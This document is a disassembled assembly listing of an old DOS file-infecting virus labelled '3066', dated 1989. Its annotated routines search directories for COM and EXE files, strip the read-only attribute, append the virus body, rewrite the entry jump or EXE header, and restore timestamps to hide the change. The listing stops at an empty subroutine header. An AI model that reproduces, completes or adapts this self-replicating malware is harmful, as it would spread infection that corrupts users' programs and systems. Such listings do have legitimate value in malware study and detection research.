
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        3066				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   19-Mar-89					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: QRS		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

.286c

data_1e		equ	24h			; (0000:0024=45h)
data_2e		equ	26h			; (0000:0026=3D1h)
data_3e		equ	70h			; (0000:0070=0FF53h)
data_4e		equ	72h			; (0000:0072=0F000h)
data_5e		equ	80h			; (0000:0080=1094h)
data_6e		equ	82h			; (0000:0082=123h)
data_7e		equ	84h			; (0000:0084=109Eh)
data_8e		equ	86h			; (0000:0086=123h)
data_9e		equ	90h			; (0000:0090=156h)
data_10e	equ	92h			; (0000:0092=44Bh)
data_11e	equ	9Ch			; (0000:009C=0BCh)
data_13e	equ	0B3h			; (0000:00B3=1)
data_14e	equ	0C8h			; (0000:00C8=0DAh)
data_15e	equ	0D1h			; (0000:00D1=10h)
data_16e	equ	0DFh			; (0000:00DF=1)
data_17e	equ	0E3h			; (0000:00E3=1)
data_18e	equ	0EAh			; (0000:00EA=123h)
data_19e	equ	0ECh			; (0000:00EC=10DAh)
data_20e	equ	0EEh			; (0000:00EE=23h)
data_21e	equ	0F1h			; (0000:00F1=10h)
data_22e	equ	151h			; (0000:0151=0EAh)
data_23e	equ	153h			; (0000:0153=0A6F0h)
data_24e	equ	155h			; (0000:0155=0EAh)
data_25e	equ	449h			; (0000:0449=3)
data_26e	equ	972h			; (0000:0972=74h)
data_27e	equ	80h			; (00AE:0080=0FFh)
data_28e	equ	0A0h			; (5E5F:00A0=0FFh)
data_29e	equ	0F00h			; (5E5F:0F00=0FFh)
data_30e	equ	0FA0h			; (5E5F:0FA0=0FFh)
data_31e	equ	0FF60h			; (5E5F:FF60=0FFFFh)
data_32e	equ	0E0h			; (683D:00E0=0FFFFh)
data_33e	equ	0			; (6FB8:0000=0)
data_34e	equ	4			; (6FB8:0004=0)
data_35e	equ	5			; (6FB8:0005=0)
data_36e	equ	87h			; (6FB8:0087=0)
data_37e	equ	0A0h			; (6FB8:00A0=0)
data_38e	equ	0DFh			; (6FB8:00DF=0)
data_39e	equ	0E0h			; (6FB8:00E0=0)
data_40e	equ	0E2h			; (6FB8:00E2=0)
data_41e	equ	0E3h			; (6FB8:00E3=0)
data_42e	equ	0E4h			; (6FB8:00E4=0)
data_43e	equ	0E6h			; (6FB8:00E6=0)
data_44e	equ	0E8h			; (6FB8:00E8=0)
data_45e	equ	0EAh			; (6FB8:00EA=0)
data_46e	equ	0ECh			; (6FB8:00EC=0)
data_47e	equ	0EEh			; (6FB8:00EE=0)
data_48e	equ	0EFh			; (6FB8:00EF=0)
data_49e	equ	0F1h			; (6FB8:00F1=0)
data_50e	equ	0F3h			; (6FB8:00F3=0)
data_51e	equ	0F5h			; (6FB8:00F5=0)
data_93e	equ	100h			; (7188:0100=0)
data_94e	equ	0E2h			; (969B:00E2=0)

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

3066		proc	far

start:
		jmp	loc_5			; (0243)
		db	 01h,0B4h
data_54		dw	0CD09h			; Data table (indexed access)
						;  xref 6FB8:0ADC, 0B5E, 0BA4, 0C67
						;            0C7B, 0CCB, 0CD4
		db	 21h,0B8h, 00h, 4Ch,0CDh, 21h
		db	'This program only exists to beco'





		db	'me infected - COM version', 0Dh, 0Ah




		db	'$'
		db	 8Dh, 16h, 0Dh,0FFh,0FFh, 00h
		db	 01h, 8Ch
data_56		dw	4D10h			; Data table (indexed access)
						;  xref 6FB8:0270, 02DC, 046C
data_57		dw	6FB8h			; Data table (indexed access)
						;  xref 6FB8:0276, 02E0, 0470
data_58		db	0			; Data table (indexed access)
						;  xref 6FB8:0387, 03C8, 0608, 06A4
		db	 8Dh, 16h, 0Dh,0FFh,0FFh, 09h
		db	0CDh, 21h,0B8h, 00h, 4Ch,0CDh
		db	'!This program on', 0Dh, 0Ah, '$'



		db	27 dup (0)
		db	 50h, 4Ch, 49h, 43h
		db	60 dup (0)
		db	 01h, 3Fh
		db	7 dup (3Fh)
		db	 43h, 4Fh, 4Dh, 20h, 00h
		db	7 dup (0)
		db	 20h, 96h, 66h,0D7h, 12h, 4Ch
		db	 00h, 00h, 00h
		db	'TSTJ3066.COM'

		db	 00h, 00h, 01h, 3Fh
		db	10 dup (3Fh)
		db	 10h, 05h
		db	7 dup (0)
		db	 20h,0E9h, 11h,0B5h, 12h,0F6h
		db	 48h, 02h, 00h
		db	'CAT-TWO.ARC'

		db	 00h, 00h, 00h, 00h,0BCh, 0Eh
		db	 00h, 00h, 20h, 00h, 72h, 49h
		db	 73h, 12h,0EBh, 04h,0DDh, 0Ch
		db	 00h, 00h, 00h, 51h, 59h, 8Bh
		db	 0Fh, 20h, 00h
		db	 56h, 47h, 31h
loc_5:						;  xref 6FB8:0100
		jmp	short loc_6		; (0247)
		db	0F5h, 0Bh
loc_6:						;  xref 6FB8:0243
		call	sub_17			; (08BB)
		call	sub_15			; (0875)
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		mov	ds:data_22e[si],si	; (0000:0151=0EAh)
		add	word ptr ds:data_22e[si],884h	; (0000:0151=0EAh)
		mov	ds:data_23e[si],cs	; (0000:0153=0A6F0h)
		mov	ds:data_17e[si],al	; (0000:00E3=1)
		call	sub_10			; (076E)
		mov	dl,ds:data_94e[di]	; (969B:00E2=0)
		mov	ax,ds
		push	cs
		pop	ds
		jnz	loc_8			; Jump if not zero
		mov	data_56[si],984h	; (6FB8:0151=4D10h)
		mov	data_57[si],ax		; (6FB8:0153=6FB8h)
		cmp	dl,0FFh
		je	loc_8			; Jump if equal
		mov	ah,0Eh
		int	21h			; DOS Services  ah=function 0Eh
						;  set default drive dl  (0=a:)
loc_8:						;  xref 6FB8:026E, 027D
		mov	byte ptr ds:[872h][si],80h	; (6FB8:0872=0FFh)
		mov	word ptr ds:data_48e[si],0	; (6FB8:00EF=0)
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		cmp	cx,7C4h
		jge	loc_9			; Jump if > or =
		jmp	short loc_12		; (02C2)
		db	0BDh, 09h,0BCh, 0Eh, 00h
loc_9:						;  xref 6FB8:0296
		jg	loc_10			; Jump if >
		cmp	dh,0Ch
		jl	loc_12			; Jump if <
		cmp	dl,5
		jl	loc_12			; Jump if <
		cmp	dl,1Ch
		jl	loc_11			; Jump if <
loc_10:						;  xref 6FB8:029F
		mov	word ptr ds:[877h][si],0FFDCh	; (6FB8:0877=8EC0h)
		mov	byte ptr ds:[872h][si],88h	; (6FB8:0872=0FFh)
loc_11:						;  xref 6FB8:02AE
		cmp	byte ptr [si+4],0F8h
		nop				;*ASM fixup - displacement
		jae	loc_13			; Jump if above or =
loc_12:						;  xref 6FB8:0298, 02A4, 02A9, 0356
		mov	byte ptr cs:data_47e[si],0	; (6FB8:00EE=0)
		jmp	loc_30			; (0460)
		cmp	byte ptr [si+4],0F8h
		nop				;*ASM fixup - displacement
		jae	loc_13			; Jump if above or =
		or	byte ptr ds:[872h][si],4	; (6FB8:0872=0FFh)
loc_13:						;  xref 6FB8:02C0, 02D0
		mov	byte ptr ds:data_38e[si],0	; (6FB8:00DF=0)
		mov	dx,data_56[si]		; (6FB8:0151=4D10h)
		mov	ds,data_57[si]		; (6FB8:0153=6FB8h)
		mov	ax,4300h
		call	sub_1			; (0436)
		jc	loc_14			; Jump if carry Set
		mov	cs:data_51e[si],cx	; (6FB8:00F5=0)
		and	cl,0FEh
		mov	ax,4301h
		call	sub_1			; (0436)
		jc	loc_14			; Jump if carry Set
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_14			; Jump if carry Set
		push	cs
		pop	ds
		mov	ds:data_48e[si],ax	; (6FB8:00EF=0)
		mov	bx,ax
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ds:data_49e[si],cx	; (6FB8:00F1=0)
		mov	ds:data_50e[si],dx	; (6FB8:00F3=0)
		dec	byte ptr [si+4]
		nop				;*ASM fixup - displacement
		mov	dx,word ptr ds:[880h][si]	; (6FB8:0880=687h)
		mov	cx,word ptr ds:[882h][si]	; (6FB8:0882=90h)
		add	dx,4
		nop				;*ASM fixup - sign extn byte
		adc	cx,0
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_14:						;  xref 6FB8:02EA, 02FA, 0301
		push	cs
		pop	ds
		test	byte ptr ds:[872h][si],4	; (6FB8:0872=0FFh)
		jz	loc_15			; Jump if zero
		call	sub_3			; (051F)
		jmp	loc_30			; (0460)
loc_15:						;  xref 6FB8:0337
		xor	dl,dl			; Zero register
		mov	ah,47h			; 'G'
		push	si
		add	si,46h
		int	21h			; DOS Services  ah=function 47h
						;  get present dir,drive dl,1=a:
		pop	si
		cmp	byte ptr ds:data_47e[si],0	; (6FB8:00EE=0)
		jne	loc_16			; Jump if not equal
		call	sub_2			; (0444)
		jnc	loc_17			; Jump if carry=0
loc_16:						;  xref 6FB8:034F
		jmp	loc_12			; (02C2)
loc_17:						;  xref 6FB8:0354, 0433
		mov	dx,si
		add	dx,data_36e		; (6FB8:0087=0)
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		mov	word ptr [si+5],2E2Ah
		mov	word ptr [si+7],4F43h
		mov	word ptr [si+9],4Dh
		mov	ah,4Eh			; 'N'
		mov	dx,si
		add	dx,5
loc_18:						;  xref 6FB8:03A7
		mov	cx,20h
		call	sub_1			; (0436)
		jc	loc_21			; Jump if carry Set
		mov	dx,si
		add	dx,0A5h
		mov	data_58[si],0		; (6FB8:0155=0)
		call	sub_4			; (0535)
		jc	loc_20			; Jump if carry Set
		call	sub_3			; (051F)
loc_19:						;  xref 6FB8:039C
		jmp	loc_29			; (0454)
loc_20:						;  xref 6FB8:038F
		cmp	byte ptr ds:data_20e[si],0	; (0000:00EE=23h)
		jne	loc_19			; Jump if not equal
		cmp	byte ptr ds:data_24e[si],0	; (0000:0155=0EAh)
		jne	loc_25			; Jump if not equal
		mov	ah,4Fh			; 'O'
		jmp	short loc_18		; (0379)
loc_21:						;  xref 6FB8:037F
		mov	word ptr [si+7],5845h
		mov	word ptr [si+9],45h
		mov	ah,4Eh			; 'N'
		mov	dx,si
		add	dx,5
loc_22:						;  xref 6FB8:03E9
		mov	cx,20h
		call	sub_1			; (0436)
		jc	loc_25			; Jump if carry Set
		mov	dx,si
		add	dx,0A5h
		mov	data_58[si],0		; (6FB8:0155=0)
		call	sub_4			; (0535)
		jc	loc_24			; Jump if carry Set
		call	sub_3			; (051F)
loc_23:						;  xref 6FB8:03DE
		jmp	short loc_29		; (0454)
		db	90h
loc_24:						;  xref 6FB8:03D0
		cmp	byte ptr cs:data_47e[si],0	; (6FB8:00EE=0)
		jne	loc_23			; Jump if not equal
		cmp	byte ptr ds:data_24e[si],0	; (0000:0155=0EAh)
		jne	loc_25			; Jump if not equal
		mov	ah,4Fh			; 'O'
		jmp	short loc_22		; (03BA)
loc_25:						;  xref 6FB8:03A3, 03C0, 03E5
		call	sub_2			; (0444)
		mov	dx,si
		add	dx,data_13e		; (0000:00B3=1)
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
loc_26:						;  xref 6FB8:0424
		mov	ah,4Fh			; 'O'
		mov	cx,10h
		cmp	byte ptr ds:data_16e[si],0	; (0000:00DF=1)
		jne	loc_27			; Jump if not equal
		mov	byte ptr ds:data_16e[si],1	; (0000:00DF=1)
		mov	word ptr [si+5],2E2Ah
		mov	word ptr [si+7],2Ah
		mov	ah,4Eh			; 'N'
		mov	dx,si
		add	dx,5
loc_27:						;  xref 6FB8:0402
		call	sub_1			; (0436)
		jc	loc_29			; Jump if carry Set
		test	byte ptr ds:data_14e[si],10h	; (0000:00C8=0DAh)
		jz	loc_26			; Jump if zero
		mov	dx,si
		add	dx,data_15e		; (0000:00D1=10h)
		mov	ah,3Bh			; ';'
		call	sub_1			; (0436)
		jc	loc_29			; Jump if carry Set
		jmp	loc_17			; (0359)

3066		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:02E7, 02F7, 037C, 03BD, 041A, 042E, 0450
;			      0571, 0582, 058A
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		jc	loc_ret_28		; Jump if carry Set
		test	byte ptr cs:data_47e[si],0FFh	; (6FB8:00EE=0)
		jz	loc_ret_28		; Jump if zero
		stc				; Set carry flag

loc_ret_28:					;  xref 6FB8:0438, 0440
		retn
sub_1		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:0351, 03EB, 0454
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2		proc	near
		mov	word ptr [si+5],5Ch
		mov	dx,si
		add	dx,5
		mov	ah,3Bh			; ';'
		call	sub_1			; (0436)
		retn
sub_2		endp

loc_29:						;  xref 6FB8:0394, 03D5, 041D, 0431
		call	sub_2			; (0444)
		mov	dx,si
		add	dx,46h
		mov	ah,3Bh			; ';'
		int	21h			; DOS Services  ah=function 3Bh
						;  set current dir, path @ ds:dx
loc_30:						;  xref 6FB8:02C8, 033C
		mov	bx,ds:data_48e[si]	; (6FB8:00EF=0)
		or	bx,bx			; Zero ?
		jz	loc_32			; Jump if zero
		mov	cx,ds:data_51e[si]	; (6FB8:00F5=0)
		mov	dx,data_56[si]		; (6FB8:0151=4D10h)
		mov	ds,data_57[si]		; (6FB8:0153=6FB8h)
		cmp	cx,20h
		je	loc_31			; Jump if equal
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
loc_31:						;  xref 6FB8:0477
		push	cs
		pop	ds
		mov	cx,ds:data_49e[si]	; (6FB8:00F1=0)
		mov	dx,ds:data_50e[si]	; (6FB8:00F3=0)
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
loc_32:						;  xref 6FB8:0466
		mov	dl,ds:data_41e[si]	; (6FB8:00E3=0)
		mov	ah,0Eh
		int	21h			; DOS Services  ah=function 0Eh
						;  set default drive dl  (0=a:)
		call	sub_16			; (089A)
		pop	ax
		mov	ds:data_39e[si],ax	; (6FB8:00E0=0)
		cmp	byte ptr [si+3],0FFh
		je	loc_33			; Jump if equal
		add	ax,10h
		add	[si+2],ax
		pop	ax
		pop	ds
;*		jmp	dword ptr cs:[si]	;*1 entry
		db	0FFh, 2Ch
loc_33:						;  xref 6FB8:04A5
		call	sub_10			; (076E)
		push	cs
		pop	ds
		mov	ax,[si]
		mov	word ptr ds:[100h],ax	; (6FB8:0100=40E9h)
		mov	al,[si+2]
		mov	byte ptr ds:[102h],al	; (6FB8:0102=1)
		jz	loc_34			; Jump if zero
		mov	bx,ds
		add	bx,1D0h
		mov	es,bx
		mov	di,si
		mov	dx,si
		mov	cx,0BFAh
		call	sub_20			; (0D32)
		mov	cx,dx
		mov	si,dx
		dec	si
		mov	di,si
		std				; Set direction flag
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		push	ds
		pop	es
		mov	di,data_93e		; (7188:0100=0)
		mov	ds,bx
		mov	si,dx
		mov	cx,0BFAh
		call	sub_20			; (0D32)
		mov	si,100h
		push	cs
		pop	ds
		call	sub_13			; (07CD)
		mov	dx,1D0h
loc_34:						;  xref 6FB8:04C2
		mov	di,cs
		add	di,dx
		mov	word ptr [si+5],100h
		mov	[si+7],di
		pop	ax
		pop	ds
		mov	ds,di
		mov	es,di
		mov	ss,di
		xor	bx,bx			; Zero register
		xor	cx,cx			; Zero register
		xor	bp,bp			; Zero register
;*		jmp	dword ptr cs:[si+5]	;*1 entry
		db	0FFh, 6Ch, 05h
loc_35:						;  xref 6FB8:0574, 0585, 058D
		mov	byte ptr cs:data_47e[si],0	; (6FB8:00EE=0)
		retn

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:0339, 0391, 03D2
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3		proc	near
		mov	bx,ds:data_48e[si]	; (6FB8:00EF=0)
		or	bx,bx			; Zero ?
		jz	loc_ret_36		; Jump if zero
		mov	dx,si
		add	dx,data_34e		; (6FB8:0004=0)
		nop				;*ASM fixup - sign extn byte
		mov	cx,1
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx

loc_ret_36:					;  xref 6FB8:0525
		retn
sub_3		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:038C, 03CD
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_4		proc	near
		push	dx
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		add	al,41h			; 'A'
		mov	ah,3Ah			; ':'
		mov	word ptr ds:[884h][si],ax	; (6FB8:0884=8489h)
		mov	byte ptr ds:[886h][si],5Ch	; (6FB8:0886=0EAh) '\'
		push	si
		add	si,offset ds:[887h]	; (6FB8:0887=0)
		mov	ah,47h			; 'G'
		mov	di,si
		xor	dl,dl			; Zero register
		int	21h			; DOS Services  ah=function 47h
						;  get present dir,drive dl,1=a:
		pop	si
		dec	di
loc_37:						;  xref 6FB8:055B
		inc	di
		mov	al,[di]
		or	al,al			; Zero ?
		jnz	loc_37			; Jump if not zero
		pop	bx
		mov	byte ptr [di],5Ch	; '\'
		inc	di
		mov	dx,bx
loc_38:						;  xref 6FB8:056C
		mov	al,[bx]
		mov	[di],al
		inc	bx
		inc	di
		or	al,al			; Zero ?
		jnz	loc_38			; Jump if not zero

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;         Called from:	 6FB8:097E

sub_5:
		mov	ax,4300h
		call	sub_1			; (0436)
		jc	loc_35			; Jump if carry Set
		mov	cs:data_42e[si],cx	; (6FB8:00E4=0)
		and	cx,0FEh
		mov	ax,4301h
		call	sub_1			; (0436)
		jc	loc_35			; Jump if carry Set
		mov	ax,3D02h
		call	sub_1			; (0436)
		jc	loc_35			; Jump if carry Set
		mov	bx,ax
		push	ds
		push	dx
		call	sub_6			; (05BD)
		pop	dx
		pop	ds
		pushf				; Push flags
		mov	cx,cs:data_42e[si]	; (6FB8:00E4=0)
		cmp	cx,20h
		je	loc_39			; Jump if equal
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
loc_39:						;  xref 6FB8:05A1
		mov	cx,cs:data_43e[si]	; (6FB8:00E6=0)
		mov	dx,cs:data_44e[si]	; (6FB8:00E8=0)
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		popf				; Pop flags
		retn
sub_4		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:0593
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_6		proc	near
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		push	cs
		pop	ds
		mov	ds:data_43e[si],cx	; (6FB8:00E6=0)
		mov	ds:data_44e[si],dx	; (6FB8:00E8=0)
		mov	dx,si
		add	dx,0Dh
		mov	di,dx
		mov	ah,3Fh			; '?'
		mov	cx,1Ch
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		cmp	word ptr [di],5A4Dh
		je	loc_42			; Jump if equal
		call	sub_9			; (0764)
		add	ax,0CF5h
		jc	loc_ret_40		; Jump if carry Set
		cmp	byte ptr [di],0E9h
		jne	loc_41			; Jump if not equal
		mov	dx,[di+1]
		xor	cx,cx			; Zero register
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	dx,di
		add	dx,1Ch
		mov	ah,3Fh			; '?'
		mov	cx,3
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		call	sub_7			; (06AB)
		jnc	loc_41			; Jump if carry=0
		mov	cs:data_58[si],1	; (6FB8:0155=0)

loc_ret_40:					;  xref 6FB8:05E6
		retn
loc_41:						;  xref 6FB8:05EB, 0606
		call	sub_9			; (0764)
		mov	word ptr ds:[880h][si],ax	; (6FB8:0880=687h)
		mov	word ptr ds:[882h][si],dx	; (6FB8:0882=90h)
		push	ax
		mov	word ptr [di+3],0FFFFh
		mov	cx,5
		mov	ah,40h			; '@'
		mov	dx,di
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		mov	dx,si
		add	dx,5
		mov	cx,0BF5h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	byte ptr [di],0E9h
		pop	ax
		add	ax,0F7h
		mov	[di+1],ax
		mov	dx,di
		mov	cx,3
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		clc				; Clear carry flag
		retn
loc_42:						;  xref 6FB8:05DE
		cmp	word ptr [di+0Ch],0FFFFh
		jne	loc_43			; Jump if not equal
		push	si
		mov	si,[di+14h]
		mov	cx,[di+16h]
		mov	ax,cx
		mov	cl,ch
		xor	ch,ch			; Zero register
		shr	cx,1			; Shift w/zeros fill
		shr	cx,1			; Shift w/zeros fill
		shr	cx,1			; Shift w/zeros fill
		shr	cx,1			; Shift w/zeros fill
		shl	ax,1			; Shift w/zeros fill
		shl	ax,1			; Shift w/zeros fill
		shl	ax,1			; Shift w/zeros fill
		shl	ax,1			; Shift w/zeros fill
		add	si,ax
		adc	cx,0
		sub	si,3
		sbb	cx,0
		mov	ax,[di+8]
		call	sub_8			; (0751)
		add	si,ax
		adc	cx,dx
		mov	dx,si
		pop	si
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	dx,di
		add	dx,1Ch
		mov	ah,3Fh			; '?'
		mov	cx,3
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		call	sub_7			; (06AB)
		jnc	loc_46			; Jump if carry=0
		mov	cs:data_58[si],1	; (6FB8:0155=0)
		retn

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;
;         Called from:	 6FB8:0603, 069F

sub_7:
		cmp	word ptr [di+1Ch],4756h
		jne	loc_45			; Jump if not equal
		cmp	byte ptr [di+1Eh],31h	; '1'
		jne	loc_45			; Jump if not equal
loc_43:						;  xref 6FB8:0657
		stc				; Set carry flag

loc_ret_44:					;  xref 6FB8:06E0
		retn
loc_45:						;  xref 6FB8:06B0, 06B6
		clc				; Clear carry flag
		retn
loc_46:						;  xref 6FB8:06A2
		call	sub_9			; (0764)
		mov	word ptr ds:[880h][si],ax	; (6FB8:0880=687h)
		mov	word ptr ds:[882h][si],dx	; (6FB8:0882=90h)
		mov	cx,[di+4]
		shl	cx,1			; Shift w/zeros fill
		xchg	ch,cl
		mov	bp,cx
		and	bp,0FF00h
		xor	ch,ch			; Zero register
		add	bp,[di+6]
		adc	cx,0
		sub	bp,ax
		sbb	cx,dx
		jc	loc_ret_44		; Jump if carry Set
		push	ax
		push	dx
		push	word ptr [di+18h]
		mov	byte ptr [di+18h],0FFh
		mov	cx,5
		mov	ah,40h			; '@'
		mov	dx,di
		add	dx,14h
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		pop	word ptr [di+18h]
		mov	dx,si
		add	dx,5
		mov	cx,0BF5h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		pop	word ptr [di+16h]
		pop	word ptr [di+14h]
		add	word ptr [di+14h],0FAh
		adc	word ptr [di+16h],0
		mov	ax,[di+8]
		call	sub_8			; (0751)
		sub	[di+14h],ax
		sbb	[di+16h],dx
		mov	cl,0Ch
		shl	word ptr [di+16h],cl	; Shift w/zeros fill
		mov	ax,0BFAh
		add	ax,[di+2]
		mov	[di+2],ax
		and	word ptr [di+2],1FFh
		mov	al,ah
		xor	ah,ah			; Zero register
		shr	ax,1			; Shift w/zeros fill
		add	[di+4],ax
		mov	dx,di
		mov	cx,1Ch
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		clc				; Clear carry flag
		retn
sub_6		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:0684, 0721
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_8		proc	near
		xor	dx,dx			; Zero register
		shl	ax,1			; Shift w/zeros fill
		rcl	dx,1			; Rotate thru carry
		shl	ax,1			; Shift w/zeros fill
		rcl	dx,1			; Rotate thru carry
		shl	ax,1			; Shift w/zeros fill
		rcl	dx,1			; Rotate thru carry
		shl	ax,1			; Shift w/zeros fill
		rcl	dx,1			; Rotate thru carry
		retn
sub_8		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:05E0, 060F, 06BC
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_9		proc	near
		xor	dx,dx			; Zero register
		xor	cx,cx			; Zero register
		mov	ax,4202h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		retn
sub_9		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;
;         Called from:	 6FB8:0263, 04B2
